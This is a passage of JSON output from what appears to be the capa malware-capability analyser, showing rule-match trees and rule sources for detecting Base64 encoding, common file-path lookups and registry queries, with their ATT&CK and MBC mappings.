                      "characteristic": "recursive call"
                    }
                  },
                  "children": [],
                  "locations": [],
                  "captures": {}
                }
              ],
              "locations": [],
              "captures": {}
            }
          ],
          [
            {
              "type": "absolute",
              "value": 1651807856
            },
            {
              "success": true,
              "node": {
                "type": "statement",
                "statement": {
                  "type": "or"
                }
              },
              "children": [
                {
                  "success": true,
                  "node": {
                    "type": "feature",
                    "feature": {
                      "type": "characteristic",
                      "characteristic": "loop"
                    }
                  },
                  "children": [],
                  "locations": [
                    {
                      "type": "absolute",
                      "value": 1651807856
                    }
                  ],
                  "captures": {}
                },
                {
                  "success": false,
                  "node": {
                    "type": "feature",
                    "feature": {
                      "type": "characteristic",
                      "characteristic": "tight loop"
                    }
                  },
                  "children": [],
                  "locations": [],
                  "captures": {}
                },
                {
                  "success": false,
                  "node": {
                    "type": "feature",
                    "feature": {
                      "type": "characteristic",
                      "characteristic": "recursive call"
                    }
                  },
                  "children": [],
                  "locations": [],
                  "captures": {}
                }
              ],
              "locations": [],
              "captures": {}
            }
          ],
          [
            {
              "type": "absolute",
              "value": 1651808000
            },
            {
              "success": true,
              "node": {
                "type": "statement",
                "statement": {
                  "type": "or"
                }
              },
              "children": [
                {
                  "success": true,
                  "node": {
                    "type": "feature",
                    "feature": {
                      "type": "characteristic",
                      "characteristic": "loop"
                    }
                  },
                  "children": [],
                  "locations": [
                    {
                      "type": "absolute",
                      "value": 1651808000
                    }
                  ],
                  "captures": {}
                },
                {
                  "success": false,
                  "node": {
                    "type": "feature",
                    "feature": {
                      "type": "characteristic",
                      "characteristic": "tight loop"
                    }
                  },
                  "children": [],
                  "locations": [],
                  "captures": {}
                },
                {
                  "success": false,
                  "node": {
                    "type": "feature",
                    "feature": {
                      "type": "characteristic",
                      "characteristic": "recursive call"
                    }
                  },
                  "children": [],
                  "locations": [],
                  "captures": {}
                }
              ],
              "locations": [],
              "captures": {}
            }
          ],
          [
            {
              "type": "absolute",
              "value": 1651808208
            },
            {
              "success": true,
              "node": {
                "type": "statement",
                "statement": {
                  "type": "or"
                }
              },
              "children": [
                {
                  "success": false,
                  "node": {
                    "type": "feature",
                    "feature": {
                      "type": "characteristic",
                      "characteristic": "loop"
                    }
                  },
                  "children": [],
                  "locations": [],
                  "captures": {}
                },
                {
                  "success": true,
                  "node": {
                    "type": "feature",
                    "feature": {
                      "type": "characteristic",
                      "characteristic": "tight loop"
                    }
                  },
                  "children": [],
                  "locations": [
                    {
                      "type": "absolute",
                      "value": 1651808223
                    }
                  ],
                  "captures": {}
                },
                {
                  "success": false,
                  "node": {
                    "type": "feature",
                    "feature": {
                      "type": "characteristic",
                      "characteristic": "recursive call"
                    }
                  },
                  "children": [],
                  "locations": [],
                  "captures": {}
                }
              ],
              "locations": [],
              "captures": {}
            }
          ],
          [
            {
              "type": "absolute",
              "value": 1651808736
            },
            {
              "success": true,
              "node": {
                "type": "statement",
                "statement": {
                  "type": "or"
                }
              },
              "children": [
                {
                  "success": true,
                  "node": {
                    "type": "feature",
                    "feature": {
                      "type": "characteristic",
                      "characteristic": "loop"
                    }
                  },
                  "children": [],
                  "locations": [
                    {
                      "type": "absolute",
                      "value": 1651808736
                    }
                  ],
                  "captures": {}
                },
                {
                  "success": false,
                  "node": {
                    "type": "feature",
                    "feature": {
                      "type": "characteristic",
                      "characteristic": "tight loop"
                    }
                  },
                  "children": [],
                  "locations": [],
                  "captures": {}
                },
                {
                  "success": false,
                  "node": {
                    "type": "feature",
                    "feature": {
                      "type": "characteristic",
                      "characteristic": "recursive call"
                    }
                  },
                  "children": [],
                  "locations": [],
                  "captures": {}
                }
              ],
              "locations": [],
              "captures": {}
            }
          ]
        ]
      },
      "encode data using Base64": {
        "meta": {
          "name": "encode data using Base64",
          "namespace": "data-manipulation/encoding/base64",
          "authors": [
            "moritz.raabe@mandiant.com",
            "anushka.virgaonkar@mandiant.com",
            "michael.hunhoff@mandiant.com"
          ],
          "scopes": {
            "static": "function"
          },
          "attack": [
            {
              "parts": [
                "Defense Evasion",
                "Obfuscated Files or Information"
              ],
              "tactic": "Defense Evasion",
              "technique": "Obfuscated Files or Information",
              "subtechnique": "",
              "id": "T1027"
            }
          ],
          "mbc": [
            {
              "parts": [
                "Defense Evasion",
                "Obfuscated Files or Information",
                "Encoding-Standard Algorithm"
              ],
              "objective": "Defense Evasion",
              "behavior": "Obfuscated Files or Information",
              "method": "Encoding-Standard Algorithm",
              "id": "E1027.m02"
            },
            {
              "parts": [
                "Data",
                "Encode Data",
                "Base64"
              ],
              "objective": "Data",
              "behavior": "Encode Data",
              "method": "Base64",
              "id": "C0026.001"
            }
          ],
          "references": [],
          "examples": [
            "BFB9B5391A13D0AFD787E87AB90F14F5:0x1314889C",
            "074072B261FC27B65C72671F13510C05:0x100049B2",
            "5DB2D2BE20D59AA0BE6709A6850F1775:0x18001CC30",
            "08AC667C65D36D6542917655571E61C8:0x406EAA"
          ],
          "description": "",
          "lib": false,
          "is_subscope_rule": false,
          "maec": {}
        },
        "source": "rule:\r\n  meta:\r\n    name: encode data using Base64\r\n    namespace: data-manipulation/encoding/base64\r\n    authors:\r\n      - moritz.raabe@mandiant.com\r\n      - anushka.virgaonkar@mandiant.com\r\n      - michael.hunhoff@mandiant.com\r\n    scopes:\r\n      static: function\r\n      dynamic: unsupported\r\n    att&ck:\r\n      - Defense Evasion::Obfuscated Files or Information [T1027]\r\n    mbc:\r\n      - Defense Evasion::Obfuscated Files or Information::Encoding-Standard Algorithm [E1027.m02]\r\n      - Data::Encode Data::Base64 [C0026.001]\r\n    examples:\r\n      - BFB9B5391A13D0AFD787E87AB90F14F5:0x1314889C\r\n      - 074072B261FC27B65C72671F13510C05:0x100049B2\r\n      - 5DB2D2BE20D59AA0BE6709A6850F1775:0x18001CC30\r\n      - 08AC667C65D36D6542917655571E61C8:0x406EAA\r\n  features:\r\n    - or:\r\n      - and:\r\n        - mnemonic: shl\r\n        - mnemonic: shr\r\n        - number: 0x3F = modulo 64\r\n        - or:\r\n          - number: 0x3D = '='\r\n          - number: 0x3D3D = '=='\r\n        - match: contain loop\r\n        - optional:\r\n          - number: 2\r\n          - number: 3\r\n          - number: 4\r\n          - number: 6\r\n          - number: 0xF\r\n          - string: \"ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789+/\"\r\n      - api: System.Convert::ToBase64String\r\n      - api: System.Convert::ToBase64CharArray\r\n      - api: System.Convert::TryToBase64Chars\r\n",
        "matches": [
          [
            {
              "type": "absolute",
              "value": 1651774768
            },
            {
              "success": true,
              "node": {
                "type": "statement",
                "statement": {
                  "type": "or"
                }
              },
              "children": [
                {
                  "success": false,
                  "node": {
                    "type": "feature",
                    "feature": {
                      "type": "api",
                      "api": "System.Convert::ToBase64String"
                    }
                  },
                  "children": [],
                  "locations": [],
                  "captures": {}
                },
                {
                  "success": false,
                  "node": {
                    "type": "feature",
                    "feature": {
                      "type": "api",
                      "api": "System.Convert::ToBase64CharArray"
                    }
                  },
                  "children": [],
                  "locations": [],
                  "captures": {}
                },
                {
                  "success": false,
                  "node": {
                    "type": "feature",
                    "feature": {
                      "type": "api",
                      "api": "System.Convert::TryToBase64Chars"
                    }
                  },
                  "children": [],
                  "locations": [],
                  "captures": {}
                },
                {
                  "success": true,
                  "node": {
                    "type": "statement",
                    "statement": {
                      "type": "and"
                    }
                  },
                  "children": [
                    {
                      "success": true,
                      "node": {
                        "type": "feature",
                        "feature": {
                          "type": "mnemonic",
                          "mnemonic": "shl"
                        }
                      },
                      "children": [],
                      "locations": [
                        {
                          "type": "absolute",
                          "value": 1651774866
                        },
                        {
                          "type": "absolute",
                          "value": 1651775027
                        },
                        {
                          "type": "absolute",
                          "value": 1651775076
                        },
                        {
                          "type": "absolute",
                          "value": 1651774990
                        },
                        {
                          "type": "absolute",
                          "value": 1651774831
                        }
                      ],
                      "captures": {}
                    },
                    {
                      "success": true,
                      "node": {
                        "type": "feature",
                        "feature": {
                          "type": "mnemonic",
                          "mnemonic": "shr"
                        }
                      },
                      "children": [],
                      "locations": [
                        {
                          "type": "absolute",
                          "value": 1651774944
                        },
                        {
                          "type": "absolute",
                          "value": 1651774812
                        }
                      ],
                      "captures": {}
                    },
                    {
                      "success": true,
                      "node": {
                        "type": "feature",
                        "feature": {
                          "type": "number",
                          "number": 63,
                          "description": "modulo 64"
                        }
                      },
                      "children": [],
                      "locations": [
                        {
                          "type": "absolute",
                          "value": 1651774905
                        }
                      ],
                      "captures": {}
                    },
                    {
                      "success": true,
                      "node": {
                        "type": "statement",
                        "statement": {
                          "type": "or"
                        }
                      },
                      "children": [
                        {
                          "success": true,
                          "node": {
                            "type": "feature",
                            "feature": {
                              "type": "number",
                              "number": 61,
                              "description": "'='"
                            }
                          },
                          "children": [],
                          "locations": [
                            {
                              "type": "absolute",
                              "value": 1651775094
                            },
                            {
                              "type": "absolute",
                              "value": 1651775046
                            }
                          ],
                          "captures": {}
                        },
                        {
                          "success": false,
                          "node": {
                            "type": "feature",
                            "feature": {
                              "type": "number",
                              "number": 15677,
                              "description": "'=='"
                            }
                          },
                          "children": [],
                          "locations": [],
                          "captures": {}
                        }
                      ],
                      "locations": [],
                      "captures": {}
                    },
                    {
                      "success": true,
                      "node": {
                        "type": "feature",
                        "feature": {
                          "type": "match",
                          "match": "contain loop"
                        }
                      },
                      "children": [
                        {
                          "success": true,
                          "node": {
                            "type": "statement",
                            "statement": {
                              "type": "or"
                            }
                          },
                          "children": [
                            {
                              "success": false,
                              "node": {
                                "type": "feature",
                                "feature": {
                                  "type": "characteristic",
                                  "characteristic": "loop"
                                }
                              },
                              "children": [],
                              "locations": [],
                              "captures": {}
                            },
                            {
                              "success": true,
                              "node": {
                                "type": "feature",
                                "feature": {
                                  "type": "characteristic",
                                  "characteristic": "tight loop"
                                }
                              },
                              "children": [],
                              "locations": [
                                {
                                  "type": "absolute",
                                  "value": 1651774808
                                }
                              ],
                              "captures": {}
                            },
                            {
                              "success": false,
                              "node": {
                                "type": "feature",
                                "feature": {
                                  "type": "characteristic",
                                  "characteristic": "recursive call"
                                }
                              },
                              "children": [],
                              "locations": [],
                              "captures": {}
                            }
                          ],
                          "locations": [],
                          "captures": {}
                        }
                      ],
                      "locations": [
                        {
                          "type": "absolute",
                          "value": 1651774768
                        }
                      ],
                      "captures": {}
                    },
                    {
                      "success": true,
                      "node": {
                        "type": "statement",
                        "statement": {
                          "type": "optional"
                        }
                      },
                      "children": [
                        {
                          "success": true,
                          "node": {
                            "type": "feature",
                            "feature": {
                              "type": "number",
                              "number": 2
                            }
                          },
                          "children": [],
                          "locations": [
                            {
                              "type": "absolute",
                              "value": 1651774944
                            },
                            {
                              "type": "absolute",
                              "value": 1651774866
                            },
                            {
                              "type": "absolute",
                              "value": 1651775027
                            },
                            {
                              "type": "absolute",
                              "value": 1651774812
                            }
                          ],
                          "captures": {}
                        },
                        {
                          "success": true,
                          "node": {
                            "type": "feature",
                            "feature": {
                              "type": "number",
                              "number": 3
                            }
                          },
                          "children": [],
                          "locations": [
                            {
                              "type": "absolute",
                              "value": 1651774880
                            },
                            {
                              "type": "absolute",
                              "value": 1651775090
                            },
                            {
                              "type": "absolute",
                              "value": 1651774917
                            },
                            {
                              "type": "absolute",
                              "value": 1651774920
                            },
                            {
                              "type": "absolute",
                              "value": 1651775019
                            }
                          ],
                          "captures": {}
                        },
                        {
                          "success": true,
                          "node": {
                            "type": "feature",
                            "feature": {
                              "type": "number",
                              "number": 4
                            }
                          },
                          "children": [],
                          "locations": [
                            {
                              "type": "absolute",
                              "value": 1651774896
                            },
                            {
                              "type": "absolute",
                              "value": 1651775076
                            },
                            {
                              "type": "absolute",
                              "value": 1651775000
                            },
                            {
                              "type": "absolute",
                              "value": 1651774842
                            },
                            {
                              "type": "absolute",
                              "value": 1651774990
                            },
                            {
                              "type": "absolute",
                              "value": 1651774831
                            }
                          ],
                          "captures": {}
                        },
                        {
                          "success": true,
                          "node": {
                            "type": "feature",
                            "feature": {
                              "type": "number",
                              "number": 6
                            }
                          },
                          "children": [],
                          "locations": [
                            {
                              "type": "absolute",
                              "value": 1651774877
                            }
                          ],
                          "captures": {}
                        },
                        {
                          "success": true,
                          "node": {
                            "type": "feature",
                            "feature": {
                              "type": "number",
                              "number": 15
                            }
                          },
                          "children": [],
                          "locations": [
                            {
                              "type": "absolute",
                              "value": 1651775003
                            },
                            {
                              "type": "absolute",
                              "value": 1651774845
                            }
                          ],
                          "captures": {}
                        },
                        {
                          "success": true,
                          "node": {
                            "type": "feature",
                            "feature": {
                              "type": "string",
                              "string": "ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789+/"
                            }
                          },
                          "children": [],
                          "locations": [
                            {
                              "type": "absolute",
                              "value": 1651774794
                            },
                            {
                              "type": "absolute",
                              "value": 1651774979
                            },
                            {
                              "type": "absolute",
                              "value": 1651774951
                            }
                          ],
                          "captures": {}
                        }
                      ],
                      "locations": [],
                      "captures": {}
                    }
                  ],
                  "locations": [],
                  "captures": {}
                }
              ],
              "locations": [],
              "captures": {}
            }
          ]
        ]
      },
      "get common file path": {
        "meta": {
          "name": "get common file path",
          "namespace": "host-interaction/file-system",
          "authors": [
            "moritz.raabe@mandiant.com",
            "michael.hunhoff@mandiant.com",
            "anushka.virgaonkar@mandiant.com"
          ],
          "scopes": {
            "static": "function",
            "dynamic": "call"
          },
          "attack": [
            {
              "parts": [
                "Discovery",
                "File and Directory Discovery"
              ],
              "tactic": "Discovery",
              "technique": "File and Directory Discovery",
              "subtechnique": "",
              "id": "T1083"
            }
          ],
          "mbc": [
            {
              "parts": [
                "Discovery",
                "File and Directory Discovery"
              ],
              "objective": "Discovery",
              "behavior": "File and Directory Discovery",
              "method": "",
              "id": "E1083"
            }
          ],
          "references": [],
          "examples": [
            "Practical Malware Analysis Lab 03-02.dll_:0x10003415",
            "972B219F18379907A045431303F4DA7D:0x404887"
          ],
          "description": "",
          "lib": false,
          "is_subscope_rule": false,
          "maec": {}
        },
        "source": "rule:\r\n  meta:\r\n    name: get common file path\r\n    namespace: host-interaction/file-system\r\n    authors:\r\n      - moritz.raabe@mandiant.com\r\n      - michael.hunhoff@mandiant.com\r\n      - anushka.virgaonkar@mandiant.com\r\n    scopes:\r\n      static: function\r\n      dynamic: call\r\n    att&ck:\r\n      - Discovery::File and Directory Discovery [T1083]\r\n    mbc:\r\n      - Discovery::File and Directory Discovery [E1083]\r\n    examples:\r\n      - Practical Malware Analysis Lab 03-02.dll_:0x10003415\r\n      - 972B219F18379907A045431303F4DA7D:0x404887\r\n  features:\r\n    - or:\r\n      - api: kernel32.GetTempPath\r\n      - api: kernel32.GetTempFileName\r\n      - api: kernel32.GetSystemDirectory\r\n      - api: kernel32.GetWindowsDirectory\r\n      - api: kernel32.GetSystemWow64Directory\r\n      - api: GetAllUsersProfileDirectory\r\n      - api: GetAppContainerFolderPath\r\n      - api: GetCurrentDirectory\r\n      - api: GetDefaultUserProfileDirectory\r\n      - api: GetProfilesDirectory\r\n      - api: GetUserProfileDirectory\r\n      - api: SHGetFolderPathAndSubDir\r\n      - api: shell32.SHGetFolderPath\r\n      - api: shell32.SHGetFolderLocation\r\n      - api: shell32.SHGetKnownFolderPath\r\n      - api: shell32.SHGetSpecialFolderPath\r\n      - api: shell32.SHGetSpecialFolderLocation\r\n      - api: System.IO.Directory::GetCurrentDirectory\r\n      - api: System.Environment::GetFolderPath\r\n      - property/read: System.Environment::SystemDirectory\r\n      - property/read: System.Environment::CurrentDirectory\r\n",
        "matches": [
          [
            {
              "type": "absolute",
              "value": 1651776272
            },
            {
              "success": true,
              "node": {
                "type": "statement",
                "statement": {
                  "type": "or"
                }
              },
              "children": [
                {
                  "success": false,
                  "node": {
                    "type": "feature",
                    "feature": {
                      "type": "api",
                      "api": "GetTempPath"
                    }
                  },
                  "children": [],
                  "locations": [],
                  "captures": {}
                },
                {
                  "success": false,
                  "node": {
                    "type": "feature",
                    "feature": {
                      "type": "api",
                      "api": "GetTempFileName"
                    }
                  },
                  "children": [],
                  "locations": [],
                  "captures": {}
                },
                {
                  "success": false,
                  "node": {
                    "type": "feature",
                    "feature": {
                      "type": "api",
                      "api": "GetSystemDirectory"
                    }
                  },
                  "children": [],
                  "locations": [],
                  "captures": {}
                },
                {
                  "success": false,
                  "node": {
                    "type": "feature",
                    "feature": {
                      "type": "api",
                      "api": "GetWindowsDirectory"
                    }
                  },
                  "children": [],
                  "locations": [],
                  "captures": {}
                },
                {
                  "success": false,
                  "node": {
                    "type": "feature",
                    "feature": {
                      "type": "api",
                      "api": "GetSystemWow64Directory"
                    }
                  },
                  "children": [],
                  "locations": [],
                  "captures": {}
                },
                {
                  "success": false,
                  "node": {
                    "type": "feature",
                    "feature": {
                      "type": "api",
                      "api": "GetAllUsersProfileDirectory"
                    }
                  },
                  "children": [],
                  "locations": [],
                  "captures": {}
                },
                {
                  "success": false,
                  "node": {
                    "type": "feature",
                    "feature": {
                      "type": "api",
                      "api": "GetAppContainerFolderPath"
                    }
                  },
                  "children": [],
                  "locations": [],
                  "captures": {}
                },
                {
                  "success": false,
                  "node": {
                    "type": "feature",
                    "feature": {
                      "type": "api",
                      "api": "GetCurrentDirectory"
                    }
                  },
                  "children": [],
                  "locations": [],
                  "captures": {}
                },
                {
                  "success": false,
                  "node": {
                    "type": "feature",
                    "feature": {
                      "type": "api",
                      "api": "GetDefaultUserProfileDirectory"
                    }
                  },
                  "children": [],
                  "locations": [],
                  "captures": {}
                },
                {
                  "success": false,
                  "node": {
                    "type": "feature",
                    "feature": {
                      "type": "api",
                      "api": "GetProfilesDirectory"
                    }
                  },
                  "children": [],
                  "locations": [],
                  "captures": {}
                },
                {
                  "success": false,
                  "node": {
                    "type": "feature",
                    "feature": {
                      "type": "api",
                      "api": "GetUserProfileDirectory"
                    }
                  },
                  "children": [],
                  "locations": [],
                  "captures": {}
                },
                {
                  "success": false,
                  "node": {
                    "type": "feature",
                    "feature": {
                      "type": "api",
                      "api": "SHGetFolderPathAndSubDir"
                    }
                  },
                  "children": [],
                  "locations": [],
                  "captures": {}
                },
                {
                  "success": true,
                  "node": {
                    "type": "feature",
                    "feature": {
                      "type": "api",
                      "api": "SHGetFolderPath"
                    }
                  },
                  "children": [],
                  "locations": [
                    {
                      "type": "absolute",
                      "value": 1651776311
                    }
                  ],
                  "captures": {}
                },
                {
                  "success": false,
                  "node": {
                    "type": "feature",
                    "feature": {
                      "type": "api",
                      "api": "SHGetFolderLocation"
                    }
                  },
                  "children": [],
                  "locations": [],
                  "captures": {}
                },
                {
                  "success": false,
                  "node": {
                    "type": "feature",
                    "feature": {
                      "type": "api",
                      "api": "SHGetKnownFolderPath"
                    }
                  },
                  "children": [],
                  "locations": [],
                  "captures": {}
                },
                {
                  "success": false,
                  "node": {
                    "type": "feature",
                    "feature": {
                      "type": "api",
                      "api": "SHGetSpecialFolderPath"
                    }
                  },
                  "children": [],
                  "locations": [],
                  "captures": {}
                },
                {
                  "success": false,
                  "node": {
                    "type": "feature",
                    "feature": {
                      "type": "api",
                      "api": "SHGetSpecialFolderLocation"
                    }
                  },
                  "children": [],
                  "locations": [],
                  "captures": {}
                },
                {
                  "success": false,
                  "node": {
                    "type": "feature",
                    "feature": {
                      "type": "api",
                      "api": "System.IO.Directory::GetCurrentDirectory"
                    }
                  },
                  "children": [],
                  "locations": [],
                  "captures": {}
                },
                {
                  "success": false,
                  "node": {
                    "type": "feature",
                    "feature": {
                      "type": "api",
                      "api": "System.Environment::GetFolderPath"
                    }
                  },
                  "children": [],
                  "locations": [],
                  "captures": {}
                },
                {
                  "success": false,
                  "node": {
                    "type": "feature",
                    "feature": {
                      "type": "property",
                      "access": "read",
                      "property": "System.Environment::SystemDirectory"
                    }
                  },
                  "children": [],
                  "locations": [],
                  "captures": {}
                },
                {
                  "success": false,
                  "node": {
                    "type": "feature",
                    "feature": {
                      "type": "property",
                      "access": "read",
                      "property": "System.Environment::CurrentDirectory"
                    }
                  },
                  "children": [],
                  "locations": [],
                  "captures": {}
                }
              ],
              "locations": [],
              "captures": {}
            }
          ],
          [
            {
              "type": "absolute",
              "value": 1651785376
            },
            {
              "success": true,
              "node": {
                "type": "statement",
                "statement": {
                  "type": "or"
                }
              },
              "children": [
                {
                  "success": false,
                  "node": {
                    "type": "feature",
                    "feature": {
                      "type": "api",
                      "api": "GetTempPath"
                    }
                  },
                  "children": [],
                  "locations": [],
                  "captures": {}
                },
                {
                  "success": false,
                  "node": {
                    "type": "feature",
                    "feature": {
                      "type": "api",
                      "api": "GetTempFileName"
                    }
                  },
                  "children": [],
                  "locations": [],
                  "captures": {}
                },
                {
                  "success": false,
                  "node": {
                    "type": "feature",
                    "feature": {
                      "type": "api",
                      "api": "GetSystemDirectory"
                    }
                  },
                  "children": [],
                  "locations": [],
                  "captures": {}
                },
                {
                  "success": false,
                  "node": {
                    "type": "feature",
                    "feature": {
                      "type": "api",
                      "api": "GetWindowsDirectory"
                    }
                  },
                  "children": [],
                  "locations": [],
                  "captures": {}
                },
                {
                  "success": false,
                  "node": {
                    "type": "feature",
                    "feature": {
                      "type": "api",
                      "api": "GetSystemWow64Directory"
                    }
                  },
                  "children": [],
                  "locations": [],
                  "captures": {}
                },
                {
                  "success": false,
                  "node": {
                    "type": "feature",
                    "feature": {
                      "type": "api",
                      "api": "GetAllUsersProfileDirectory"
                    }
                  },
                  "children": [],
                  "locations": [],
                  "captures": {}
                },
                {
                  "success": false,
                  "node": {
                    "type": "feature",
                    "feature": {
                      "type": "api",
                      "api": "GetAppContainerFolderPath"
                    }
                  },
                  "children": [],
                  "locations": [],
                  "captures": {}
                },
                {
                  "success": true,
                  "node": {
                    "type": "feature",
                    "feature": {
                      "type": "api",
                      "api": "GetCurrentDirectory"
                    }
                  },
                  "children": [],
                  "locations": [
                    {
                      "type": "absolute",
                      "value": 1651785761
                    },
                    {
                      "type": "absolute",
                      "value": 1651786411
                    }
                  ],
                  "captures": {}
                },
                {
                  "success": false,
                  "node": {
                    "type": "feature",
                    "feature": {
                      "type": "api",
                      "api": "GetDefaultUserProfileDirectory"
                    }
                  },
                  "children": [],
                  "locations": [],
                  "captures": {}
                },
                {
                  "success": false,
                  "node": {
                    "type": "feature",
                    "feature": {
                      "type": "api",
                      "api": "GetProfilesDirectory"
                    }
                  },
                  "children": [],
                  "locations": [],
                  "captures": {}
                },
                {
                  "success": false,
                  "node": {
                    "type": "feature",
                    "feature": {
                      "type": "api",
                      "api": "GetUserProfileDirectory"
                    }
                  },
                  "children": [],
                  "locations": [],
                  "captures": {}
                },
                {
                  "success": false,
                  "node": {
                    "type": "feature",
                    "feature": {
                      "type": "api",
                      "api": "SHGetFolderPathAndSubDir"
                    }
                  },
                  "children": [],
                  "locations": [],
                  "captures": {}
                },
                {
                  "success": false,
                  "node": {
                    "type": "feature",
                    "feature": {
                      "type": "api",
                      "api": "SHGetFolderPath"
                    }
                  },
                  "children": [],
                  "locations": [],
                  "captures": {}
                },
                {
                  "success": false,
                  "node": {
                    "type": "feature",
                    "feature": {
                      "type": "api",
                      "api": "SHGetFolderLocation"
                    }
                  },
                  "children": [],
                  "locations": [],
                  "captures": {}
                },
                {
                  "success": false,
                  "node": {
                    "type": "feature",
                    "feature": {
                      "type": "api",
                      "api": "SHGetKnownFolderPath"
                    }
                  },
                  "children": [],
                  "locations": [],
                  "captures": {}
                },
                {
                  "success": false,
                  "node": {
                    "type": "feature",
                    "feature": {
                      "type": "api",
                      "api": "SHGetSpecialFolderPath"
                    }
                  },
                  "children": [],
                  "locations": [],
                  "captures": {}
                },
                {
                  "success": false,
                  "node": {
                    "type": "feature",
                    "feature": {
                      "type": "api",
                      "api": "SHGetSpecialFolderLocation"
                    }
                  },
                  "children": [],
                  "locations": [],
                  "captures": {}
                },
                {
                  "success": false,
                  "node": {
                    "type": "feature",
                    "feature": {
                      "type": "api",
                      "api": "System.IO.Directory::GetCurrentDirectory"
                    }
                  },
                  "children": [],
                  "locations": [],
                  "captures": {}
                },
                {
                  "success": false,
                  "node": {
                    "type": "feature",
                    "feature": {
                      "type": "api",
                      "api": "System.Environment::GetFolderPath"
                    }
                  },
                  "children": [],
                  "locations": [],
                  "captures": {}
                },
                {
                  "success": false,
                  "node": {
                    "type": "feature",
                    "feature": {
                      "type": "property",
                      "access": "read",
                      "property": "System.Environment::SystemDirectory"
                    }
                  },
                  "children": [],
                  "locations": [],
                  "captures": {}
                },
                {
                  "success": false,
                  "node": {
                    "type": "feature",
                    "feature": {
                      "type": "property",
                      "access": "read",
                      "property": "System.Environment::CurrentDirectory"
                    }
                  },
                  "children": [],
                  "locations": [],
                  "captures": {}
                }
              ],
              "locations": [],
              "captures": {}
            }
          ],
          [
            {
              "type": "absolute",
              "value": 1651797440
            },
            {
              "success": true,
              "node": {
                "type": "statement",
                "statement": {
                  "type": "or"
                }
              },
              "children": [
                {
                  "success": true,
                  "node": {
                    "type": "feature",
                    "feature": {
                      "type": "api",
                      "api": "GetTempPath"
                    }
                  },
                  "children": [],
                  "locations": [
                    {
                      "type": "absolute",
                      "value": 1651797550
                    }
                  ],
                  "captures": {}
                },
                {
                  "success": true,
                  "node": {
                    "type": "feature",
                    "feature": {
                      "type": "api",
                      "api": "GetTempFileName"
                    }
                  },
                  "children": [],
                  "locations": [
                    {
                      "type": "absolute",
                      "value": 1651797680
                    },
                    {
                      "type": "absolute",
                      "value": 1651797575
                    }
                  ],
                  "captures": {}
                },
                {
                  "success": true,
                  "node": {
                    "type": "feature",
                    "feature": {
                      "type": "api",
                      "api": "GetSystemDirectory"
                    }
                  },
                  "children": [],
                  "locations": [
                    {
                      "type": "absolute",
                      "value": 1651797882
                    }
                  ],
                  "captures": {}
                },
                {
                  "success": false,
                  "node": {
                    "type": "feature",
                    "feature": {
                      "type": "api",
                      "api": "GetWindowsDirectory"
                    }
                  },
                  "children": [],
                  "locations": [],
                  "captures": {}
                },
                {
                  "success": false,
                  "node": {
                    "type": "feature",
                    "feature": {
                      "type": "api",
                      "api": "GetSystemWow64Directory"
                    }
                  },
                  "children": [],
                  "locations": [],
                  "captures": {}
                },
                {
                  "success": false,
                  "node": {
                    "type": "feature",
                    "feature": {
                      "type": "api",
                      "api": "GetAllUsersProfileDirectory"
                    }
                  },
                  "children": [],
                  "locations": [],
                  "captures": {}
                },
                {
                  "success": false,
                  "node": {
                    "type": "feature",
                    "feature": {
                      "type": "api",
                      "api": "GetAppContainerFolderPath"
                    }
                  },
                  "children": [],
                  "locations": [],
                  "captures": {}
                },
                {
                  "success": false,
                  "node": {
                    "type": "feature",
                    "feature": {
                      "type": "api",
                      "api": "GetCurrentDirectory"
                    }
                  },
                  "children": [],
                  "locations": [],
                  "captures": {}
                },
                {
                  "success": false,
                  "node": {
                    "type": "feature",
                    "feature": {
                      "type": "api",
                      "api": "GetDefaultUserProfileDirectory"
                    }
                  },
                  "children": [],
                  "locations": [],
                  "captures": {}
                },
                {
                  "success": false,
                  "node": {
                    "type": "feature",
                    "feature": {
                      "type": "api",
                      "api": "GetProfilesDirectory"
                    }
                  },
                  "children": [],
                  "locations": [],
                  "captures": {}
                },
                {
                  "success": false,
                  "node": {
                    "type": "feature",
                    "feature": {
                      "type": "api",
                      "api": "GetUserProfileDirectory"
                    }
                  },
                  "children": [],
                  "locations": [],
                  "captures": {}
                },
                {
                  "success": false,
                  "node": {
                    "type": "feature",
                    "feature": {
                      "type": "api",
                      "api": "SHGetFolderPathAndSubDir"
                    }
                  },
                  "children": [],
                  "locations": [],
                  "captures": {}
                },
                {
                  "success": false,
                  "node": {
                    "type": "feature",
                    "feature": {
                      "type": "api",
                      "api": "SHGetFolderPath"
                    }
                  },
                  "children": [],
                  "locations": [],
                  "captures": {}
                },
                {
                  "success": false,
                  "node": {
                    "type": "feature",
                    "feature": {
                      "type": "api",
                      "api": "SHGetFolderLocation"
                    }
                  },
                  "children": [],
                  "locations": [],
                  "captures": {}
                },
                {
                  "success": false,
                  "node": {
                    "type": "feature",
                    "feature": {
                      "type": "api",
                      "api": "SHGetKnownFolderPath"
                    }
                  },
                  "children": [],
                  "locations": [],
                  "captures": {}
                },
                {
                  "success": false,
                  "node": {
                    "type": "feature",
                    "feature": {
                      "type": "api",
                      "api": "SHGetSpecialFolderPath"
                    }
                  },
                  "children": [],
                  "locations": [],
                  "captures": {}
                },
                {
                  "success": false,
                  "node": {
                    "type": "feature",
                    "feature": {
                      "type": "api",
                      "api": "SHGetSpecialFolderLocation"
                    }
                  },
                  "children": [],
                  "locations": [],
                  "captures": {}
                },
                {
                  "success": false,
                  "node": {
                    "type": "feature",
                    "feature": {
                      "type": "api",
                      "api": "System.IO.Directory::GetCurrentDirectory"
                    }
                  },
                  "children": [],
                  "locations": [],
                  "captures": {}
                },
                {
                  "success": false,
                  "node": {
                    "type": "feature",
                    "feature": {
                      "type": "api",
                      "api": "System.Environment::GetFolderPath"
                    }
                  },
                  "children": [],
                  "locations": [],
                  "captures": {}
                },
                {
                  "success": false,
                  "node": {
                    "type": "feature",
                    "feature": {
                      "type": "property",
                      "access": "read",
                      "property": "System.Environment::SystemDirectory"
                    }
                  },
                  "children": [],
                  "locations": [],
                  "captures": {}
                },
                {
                  "success": false,
                  "node": {
                    "type": "feature",
                    "feature": {
                      "type": "property",
                      "access": "read",
                      "property": "System.Environment::CurrentDirectory"
                    }
                  },
                  "children": [],
                  "locations": [],
                  "captures": {}
                }
              ],
              "locations": [],
              "captures": {}
            }
          ]
        ]
      },
      "query or enumerate registry value": {
        "meta": {
          "name": "query or enumerate registry value",
          "namespace": "host-interaction/registry",
          "authors": [
            "william.ballenthin@mandiant.com",
            "michael.hunhoff@mandiant.com",
            "anushka.virgaonkar@mandiant.com"
          ],
